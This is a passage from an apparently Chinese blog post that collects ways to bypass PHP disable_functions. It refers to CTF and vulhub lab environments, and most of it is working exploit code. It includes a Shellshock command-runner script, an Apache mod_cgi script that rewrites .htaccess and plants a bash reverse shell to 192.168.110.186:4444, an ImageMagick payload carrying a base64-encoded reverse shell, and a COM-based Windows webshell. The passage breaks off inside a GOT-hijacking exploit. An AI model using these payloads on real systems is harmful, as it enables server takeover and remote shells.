+<h4 id="1漏洞说明传送门">1、漏洞说明传送门<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#1%E6%BC%8F%E6%B4%9E%E8%AF%B4%E6%98%8E%E4%BC%A0%E9%80%81%E9%97%A8" class="esa-anchor">#</a></h4>
+<p><a href="https://wooyun.js.org/drops/Shellshock%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE%E4%B8%8E%E5%88%86%E6%9E%90%E6%B5%8B%E8%AF%95.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/Shellshock漏洞回顾与分析测试.html</a></p>
+<h4 id="2漏洞环境">2、漏洞环境<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#2%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83" class="esa-anchor">#</a></h4>
+<p>暂无<br>
+AntSword 虚拟终端中已经集成了对 ShellShock 的利用, 直接在虚拟终端执行命令即可</p>
+<h4 id="3php脚本调用">3、php脚本调用<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#3php%E8%84%9A%E6%9C%AC%E8%B0%83%E7%94%A8" class="esa-anchor">#</a></h4>
+<pre class="highlighter-hljs" highlighted="true"><code class="hljsln highlighter-hljs hljs language-php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">runcmd</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>)</span>{
+
+  <span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">"SCRIPT_FILENAME"</span>]);
+
+  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$d</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) == <span class="hljs-string">"/"</span> &amp;&amp; <span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">'putenv'</span>) &amp;&amp; (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">'error_log'</span>) || <span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">'mail'</span>))){
+
+    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-title function_ invoke__">readlink</span>(<span class="hljs-string">"/bin/sh"</span>), <span class="hljs-string">"bash"</span>)!=<span class="hljs-literal">FALSE</span>){
+
+      <span class="hljs-variable">$tmp</span>=<span class="hljs-title function_ invoke__">tempnam</span>(<span class="hljs-title function_ invoke__">sys_get_temp_dir</span>(), <span class="hljs-string">'as'</span>);
+
+      <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">"PHP_LOL=() { x; }; <span class="hljs-subst">$c</span> &gt;<span class="hljs-subst">$tmp</span> 2&gt;&amp;1"</span>);
+
+      <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">'error_log'</span>)) {
+
+        <span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">"a"</span>, <span class="hljs-number">1</span>);
+
+      }<span class="hljs-keyword">else</span>{
+
+        <span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">"a@127.0.0.1"</span>, <span class="hljs-string">""</span>, <span class="hljs-string">""</span>, <span class="hljs-string">"-bv"</span>);
+
+      }
+
+    }<span class="hljs-keyword">else</span>{
+
+      <span class="hljs-keyword">print</span>(<span class="hljs-string">"Not vuln (not bash)\n"</span>);
+
+    }
+
+    <span class="hljs-variable">$output</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp</span>);
+
+    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$tmp</span>);
+
+    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$output</span>!=<span class="hljs-string">""</span>){
+
+      <span class="hljs-keyword">print</span>(<span class="hljs-variable">$output</span>);
+
+    }<span class="hljs-keyword">else</span>{
+
+      <span class="hljs-keyword">print</span>(<span class="hljs-string">"No output, or not vuln."</span>);
+
+    }
+
+  }<span class="hljs-keyword">else</span>{
+
+    <span class="hljs-keyword">print</span>(<span class="hljs-string">"不满足使用条件"</span>);
+
+  }
+
+}
+
+
+
+<span class="hljs-comment">// runcmd("whoami"); // 要执行的命令</span>
+
+<span class="hljs-title function_ invoke__">runcmd</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">"cmd"</span>]); <span class="hljs-comment">// ?cmd=whoami</span>
+
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<h3 id="四apache-mod-cgi">四、Apache Mod CGI<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#%E5%9B%9Bapache-mod-cgi" class="esa-anchor">#</a></h3>
+<h4 id="1简单说明">1、简单说明<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#1%E7%AE%80%E5%8D%95%E8%AF%B4%E6%98%8E" class="esa-anchor">#</a></h4>
+<p>如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令</p>
+<h4 id="2使用条件">2、使用条件<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#2%E4%BD%BF%E7%94%A8%E6%9D%A1%E4%BB%B6" class="esa-anchor">#</a></h4>
+<pre class="highlighter-hljs" highlighted="true"><code class="hljsln highlighter-hljs hljs language-css"><span class="hljs-number">1</span>、apache环境
+
+<span class="hljs-number">2</span>、mod_cgi已经启用
+
+<span class="hljs-number">3</span>、必须允许<span class="hljs-selector-class">.htaccess</span>文件，也就是说在httpd<span class="hljs-selector-class">.conf</span>中，要注意AllowOverride选项为<span class="hljs-attribute">All</span>，而不是<span class="hljs-attribute">none</span>
+
+<span class="hljs-number">4</span>、必须有权限写<span class="hljs-selector-class">.htaccess</span>文件
+</code></pre>
+<h4 id="3漏洞环境">3、漏洞环境<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#3%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83" class="esa-anchor">#</a></h4>
+<p><a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/3" target="_blank" rel="noopener">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/3</a></p>
+<h4 id="4蚁剑插件">4、蚁剑插件<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#4%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6" class="esa-anchor">#</a></h4>
+<p>使用后会弹出个新的虚拟终端，即可执行命令<br>
+<a href="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/1879842-20210724221940976-499390375.png" data-title="" data-alt="" data-lightbox="roadtrip"><img src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/1879842-20210724221940976-499390375.png" alt="" loading="lazy" class="medium-zoom-image"></a></p>
+<h4 id="5反弹shell的exp">5、反弹shell的EXP<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#5%E5%8F%8D%E5%BC%B9shell%E7%9A%84exp" class="esa-anchor">#</a></h4>
+<pre class="highlighter-hljs" highlighted="true"><code class="hljsln highlighter-hljs hljs language-php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-variable">$cmd</span> = <span class="hljs-string">"bash -i &gt;&amp; /dev/tcp/192.168.110.186/4444 0&gt;&amp;1"</span>; 
+
+<span class="hljs-variable">$shellfile</span> = <span class="hljs-string">"#!/bin/bash\n"</span>; <span class="hljs-comment">//using a shellscript</span>
+
+<span class="hljs-variable">$shellfile</span> .= <span class="hljs-string">"echo -ne \"Content-Type: text/html\\n\\n\"\n"</span>; <span class="hljs-comment">//header is needed, otherwise a 500 error is thrown when there is output</span>
+
+<span class="hljs-variable">$shellfile</span> .= <span class="hljs-string">"<span class="hljs-subst">$cmd</span>"</span>; <span class="hljs-comment">//executing $cmd</span>
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkEnabled</span>(<span class="hljs-params"><span class="hljs-variable">$text</span>,<span class="hljs-variable">$condition</span>,<span class="hljs-variable">$yes</span>,<span class="hljs-variable">$no</span></span>) //<span class="hljs-title">this</span> <span class="hljs-title">surely</span> <span class="hljs-title">can</span> <span class="hljs-title">be</span> <span class="hljs-title">shorter</span>
+
+</span>{
+
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">"<span class="hljs-subst">$text</span>: "</span> . (<span class="hljs-variable">$condition</span> ? <span class="hljs-variable">$yes</span> : <span class="hljs-variable">$no</span>) . <span class="hljs-string">"&lt;br&gt;\n"</span>;
+
+}
+
+<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'checked'</span>]))
+
+{
+
+    @<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">'.htaccess'</span>, <span class="hljs-string">"\nSetEnv HTACCESS on"</span>, FILE_APPEND); <span class="hljs-comment">//Append it to a .htaccess file to see whether .htaccess is allowed</span>
+
+    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">'Location: '</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'PHP_SELF'</span>] . <span class="hljs-string">'?checked=true'</span>); <span class="hljs-comment">//execute the script again to see if the htaccess test worked</span>
+
+}
+
+<span class="hljs-keyword">else</span>
+
+{
+
+    <span class="hljs-variable">$modcgi</span> = <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-string">'mod_cgi'</span>, <span class="hljs-title function_ invoke__">apache_get_modules</span>()); <span class="hljs-comment">// mod_cgi enabled?</span>
+
+    <span class="hljs-variable">$writable</span> = <span class="hljs-title function_ invoke__">is_writable</span>(<span class="hljs-string">'.'</span>); <span class="hljs-comment">//current dir writable?</span>
+
+    <span class="hljs-variable">$htaccess</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'HTACCESS'</span>]); <span class="hljs-comment">//htaccess enabled?</span>
+
+        <span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">"Mod-Cgi enabled"</span>,<span class="hljs-variable">$modcgi</span>,<span class="hljs-string">"Yes"</span>,<span class="hljs-string">"No"</span>);
+
+        <span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">"Is writable"</span>,<span class="hljs-variable">$writable</span>,<span class="hljs-string">"Yes"</span>,<span class="hljs-string">"No"</span>);
+
+        <span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">"htaccess working"</span>,<span class="hljs-variable">$htaccess</span>,<span class="hljs-string">"Yes"</span>,<span class="hljs-string">"No"</span>);
+
+    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$modcgi</span> &amp;&amp; <span class="hljs-variable">$writable</span> &amp;&amp; <span class="hljs-variable">$htaccess</span>))
+
+    {
+
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Error. All of the above must be true for the script to work!"</span>; <span class="hljs-comment">//abort if not</span>
+
+    }
+
+    <span class="hljs-keyword">else</span>
+
+    {
+
+        <span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">"Backing up .htaccess"</span>,<span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".htaccess.bak"</span>),<span class="hljs-string">"Suceeded! Saved in .htaccess.bak"</span>,<span class="hljs-string">"Failed!"</span>); <span class="hljs-comment">//make a backup, cause you never know.</span>
+
+        <span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">"Write .htaccess file"</span>,<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">'.htaccess'</span>,<span class="hljs-string">"Options +ExecCGI\nAddHandler cgi-script .dizzle"</span>),<span class="hljs-string">"Succeeded!"</span>,<span class="hljs-string">"Failed!"</span>); <span class="hljs-comment">//.dizzle is a nice extension</span>
+
+        <span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">"Write shell file"</span>,<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">'shell.dizzle'</span>,<span class="hljs-variable">$shellfile</span>),<span class="hljs-string">"Succeeded!"</span>,<span class="hljs-string">"Failed!"</span>); <span class="hljs-comment">//write the file</span>
+
+        <span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">"Chmod 777"</span>,<span class="hljs-title function_ invoke__">chmod</span>(<span class="hljs-string">"shell.dizzle"</span>,<span class="hljs-number">0777</span>),<span class="hljs-string">"Succeeded!"</span>,<span class="hljs-string">"Failed!"</span>); <span class="hljs-comment">//rwx</span>
+
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Executing the script now. Check your listener &lt;img src = 'shell.dizzle' style = 'display:none;'&gt;"</span>; <span class="hljs-comment">//call the script</span>
+
+    }
+
+}
+
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<p>上传并访问如上php,即可生成一个.htaccess文件和一个shell.dizzle文件,在访问shell.dizzle即可反弹shell<br>
+1、访问shell.php<br>
+<a href="http://192.168.110.186:18080/shell.php?checked=true" target="_blank" rel="noopener">http://192.168.110.186:18080/shell.php?checked=true</a><br>
+<a href="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/1879842-20210724222607574-1535192548.png" data-title="" data-alt="" data-lightbox="roadtrip"><img src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/1879842-20210724222607574-1535192548.png" alt="" loading="lazy" class="medium-zoom-image"></a><br>
+2、监听好端口，访问shell.dizzle<br>
+<a href="http://192.168.110.186:18080/shell.dizzle" target="_blank" rel="noopener">http://192.168.110.186:18080/shell.dizzle</a><br>
+<a href="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/1879842-20210724222835197-509620350.png" data-title="" data-alt="" data-lightbox="roadtrip"><img src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/1879842-20210724222835197-509620350.png" alt="" loading="lazy" class="medium-zoom-image"></a></p>
+<h3 id="五php-fpm">五、PHP-FPM<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#%E4%BA%94php-fpm" class="esa-anchor">#</a></h3>
+<h4 id="1漏洞原理">1、漏洞原理<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#1%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86" class="esa-anchor">#</a></h4>
+<p>传送门:<a href="https://www.anquanke.com/post/id/193117?from=groupmessage#h3-7" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193117?from=groupmessage#h3-7</a></p>
+<h4 id="2漏洞环境-1">2、漏洞环境<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#2%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-1" class="esa-anchor">#</a></h4>
+<p><a href="https://www.ctfhub.com/#/skilltree" target="_blank" rel="noopener">https://www.ctfhub.com/#/skilltree</a></p>
+<h4 id="3蚁剑脚本">3、蚁剑脚本<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#3%E8%9A%81%E5%89%91%E8%84%9A%E6%9C%AC" class="esa-anchor">#</a></h4>
+<p><a href="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/1879842-20210724223857561-1911676248.png" data-title="" data-alt="" data-lightbox="roadtrip"><img src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/1879842-20210724223857561-1911676248.png" alt="" loading="lazy" class="medium-zoom-image"></a><br>
+连接.antproxy.php即可</p>
+<h3 id="六gc-uafjson-serializer-uafbacktrace-uaf">六、GC UAF、Json Serializer UAF、Backtrace UAF<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#%E5%85%ADgc-uafjson-serializer-uafbacktrace-uaf" class="esa-anchor">#</a></h3>
+<h4 id="1exp工具环境">1、EXP工具环境<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#1exp%E5%B7%A5%E5%85%B7%E7%8E%AF%E5%A2%83" class="esa-anchor">#</a></h4>
+<p><a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">https://github.com/mm0r1/exploits</a><br>
+蚁剑插件</p>
+<h4 id="2漏洞环境-2">2、漏洞环境<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#2%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-2" class="esa-anchor">#</a></h4>
+<p><a href="https://www.ctfhub.com/#/skilltree" target="_blank" rel="noopener">https://www.ctfhub.com/#/skilltree</a></p>
+<h3 id="七imagemagick">七、ImageMagick<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#%E4%B8%83imagemagick" class="esa-anchor">#</a></h3>
+<h4 id="1基本原理">1、基本原理<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#1%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86" class="esa-anchor">#</a></h4>
+<p>ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。但近来有研究者发现，当用户传入一个包含『畸形内容』的图片的时候，就有可能触发命令注入漏洞。</p>
+<h4 id="2版本条件">2、版本条件<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#2%E7%89%88%E6%9C%AC%E6%9D%A1%E4%BB%B6" class="esa-anchor">#</a></h4>
+<p>imageMagick 版本 v6.9.3-9 或 v7.0.1-0</p>
+<h4 id="3漏洞环境-1">3、漏洞环境<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#3%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-1" class="esa-anchor">#</a></h4>
+<p><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></p>
+<h4 id="4漏洞复现">4、漏洞复现<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0" class="esa-anchor">#</a></h4>
+<p>反弹shell POC</p>
+<pre class="highlighter-hljs" highlighted="true"><code class="hljsln highlighter-hljs hljs language-vhdl">push graphic-<span class="hljs-keyword">context</span>
+
+viewbox <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">640</span> <span class="hljs-number">480</span>
+
+fill <span class="hljs-symbol">'url</span>(https://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.0</span>/oops.jpg?`echo YmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMTAuMTg2LzQ0NDQgMD4mMQ== | base64 -d | bash`<span class="hljs-string">"||id "</span> )'
+
+pop graphic-<span class="hljs-keyword">context</span>
+</code></pre>
+<p><a href="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/1879842-20210724231240499-1339059949.png" data-title="" data-alt="" data-lightbox="roadtrip"><img src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/1879842-20210724231240499-1339059949.png" alt="" loading="lazy" class="medium-zoom-image"></a><br>
+<a href="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/1879842-20210724231257092-1578207985.png" data-title="" data-alt="" data-lightbox="roadtrip"><img src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/1879842-20210724231257092-1578207985.png" alt="" loading="lazy" class="medium-zoom-image"></a><br>
+不知为啥反弹失败</p>
+<h3 id="八com组件">八、COM组件<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#%E5%85%ABcom%E7%BB%84%E4%BB%B6" class="esa-anchor">#</a></h3>
+<h4 id="1条件">1、条件<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#1%E6%9D%A1%E4%BB%B6" class="esa-anchor">#</a></h4>
+<pre class="highlighter-hljs" highlighted="true"><code class="hljsln highlighter-hljs hljs language-dart"><span class="hljs-number">1.</span>com.allow_dcom = <span class="hljs-keyword">true</span>
+
+<span class="hljs-number">2.</span><span class="hljs-keyword">extension</span>=php_com_dotnet.dll
+
+<span class="hljs-number">3.</span>php&gt;<span class="hljs-number">5.4</span>
+
+<span class="hljs-number">4.</span>目标服务器为Windows系统
+</code></pre>
+<h4 id="2漏洞exp">2、漏洞exp<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#2%E6%BC%8F%E6%B4%9Eexp" class="esa-anchor">#</a></h4>
+<pre class="highlighter-hljs" highlighted="true"><code class="hljsln highlighter-hljs hljs language-php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-variable">$command</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'a'</span>];
+
+<span class="hljs-variable">$wsh</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">COM</span>(<span class="hljs-string">'WScript.shell'</span>); <span class="hljs-comment">// 生成一个COM对象　Shell.Application也能</span>
+
+<span class="hljs-variable">$exec</span> = <span class="hljs-variable">$wsh</span>-&gt;<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">"cmd /c"</span>.<span class="hljs-variable">$command</span>); <span class="hljs-comment">//调用对象方法来执行命令</span>
+
+<span class="hljs-variable">$stdout</span> = <span class="hljs-variable">$exec</span>-&gt;<span class="hljs-title function_ invoke__">StdOut</span>();
+
+<span class="hljs-variable">$stroutput</span> = <span class="hljs-variable">$stdout</span>-&gt;<span class="hljs-title function_ invoke__">ReadAll</span>();
+
+<span class="hljs-keyword">print</span>(<span class="hljs-variable">$stroutput</span>);
+
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<h3 id="九劫持got表绕过diable_function">九、劫持got表绕过diable_function<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#%E4%B9%9D%E5%8A%AB%E6%8C%81got%E8%A1%A8%E7%BB%95%E8%BF%87diable_function" class="esa-anchor">#</a></h3>
+<h4 id="1文章传送门">1、文章传送门<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#1%E6%96%87%E7%AB%A0%E4%BC%A0%E9%80%81%E9%97%A8" class="esa-anchor">#</a></h4>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247485666&amp;idx=1&amp;sn=71a0cce05637edd488cb9cccb3967504" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247485666&amp;idx=1&amp;sn=71a0cce05637edd488cb9cccb3967504</a></p>
+<h4 id="2exp代码">2、exp代码<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button><a href="https://www.cnblogs.com/sakura521/p/15055907.html#2exp%E4%BB%A3%E7%A0%81" class="esa-anchor">#</a></h4>
+<pre class="highlighter-hljs" highlighted="true"><code class="hljsln highlighter-hljs hljs language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">/***
+
+ *
+
+* BUG修正请联系我
+
+* <span class="hljs-doctag">@author</span>
+
+* <span class="hljs-doctag">@email</span> xiaozeend<span class="hljs-doctag">@pm</span>.me *
+
+*/</span>
+
+<span class="hljs-comment">/*
+
+section tables type
+
+*/</span>
+
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">'SHT_NULL'</span>,<span class="hljs-number">0</span>);
+
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">'SHT_PROGBITS'</span>,<span class="hljs-number">1</span>);
+
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">'SHT_SYMTAB'</span>,<span class="hljs-number">2</span>);
+
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">'SHT_STRTAB'</span>,<span class="hljs-number">3</span>);
+
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">'SHT_RELA'</span>,<span class="hljs-number">4</span>);
+
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">'SHT_HASH'</span>,<span class="hljs-number">5</span>);
+
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">'SHT_DYNAMIC'</span>,<span class="hljs-number">6</span>);
+
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">'SHT_NOTE'</span>,<span class="hljs-number">7</span>);
+
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">'SHT_NOBITS'</span>,<span class="hljs-number">8</span>);
+
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">'SHT_REL'</span>,<span class="hljs-number">9</span>);
+
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">'SHT_SHLIB'</span>,<span class="hljs-number">10</span>);
+
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">'SHT_DNYSYM'</span>,<span class="hljs-number">11</span>);
+
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">'SHT_INIT_ARRAY'</span>,<span class="hljs-number">14</span>);
+
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">'SHT_FINI_ARRAY'</span>,<span class="hljs-number">15</span>);
+
+<span class="hljs-comment">//why does section tables have so many fuck type</span>
+
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">'SHT_GNU_HASH'</span>,<span class="hljs-number">0x6ffffff6</span>);
+
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">'SHT_GNU_versym'</span>,<span class="hljs-number">0x6fffffff</span>);
+
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">'SHT_GNU_verneed'</span>,<span class="hljs-number">0x6ffffffe</span>);
+
+
+
+
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">elf</span></span>{
+
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$elf_bin</span>;
+
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$strtab_section</span>=<span class="hljs-keyword">array</span>();
+
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$rel_plt_section</span>=<span class="hljs-keyword">array</span>();
+
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$dynsym_section</span>=<span class="hljs-keyword">array</span>();
+
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shared_librarys</span>=<span class="hljs-keyword">array</span>();
+
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rel_plts</span>=<span class="hljs-keyword">array</span>();
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getElfBin</span>(<span class="hljs-params"></span>)
+
+</span>{
+
+        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;elf_bin;
+
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setElfBin</span>(<span class="hljs-params"><span class="hljs-variable">$elf_bin</span></span>)
+
+</span>{
+
+        <span class="hljs-variable language_">$this</span>-&gt;elf_bin = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$elf_bin</span>,<span class="hljs-string">"rb"</span>);
+
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unp</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)
+
+</span>{
+
+        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$value</span>)));
+
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$start</span>,<span class="hljs-variable">$len</span></span>)</span>{
+
+
+
+        <span class="hljs-title function_ invoke__">fseek</span>(<span class="hljs-variable language_">$this</span>-&gt;elf_bin,<span class="hljs-variable">$start</span>);
+
+        <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">fread</span> (<span class="hljs-variable language_">$this</span>-&gt;elf_bin,<span class="hljs-variable">$len</span>);
+
+        <span class="hljs-title function_ invoke__">rewind</span>(<span class="hljs-variable language_">$this</span>-&gt;elf_bin);
+
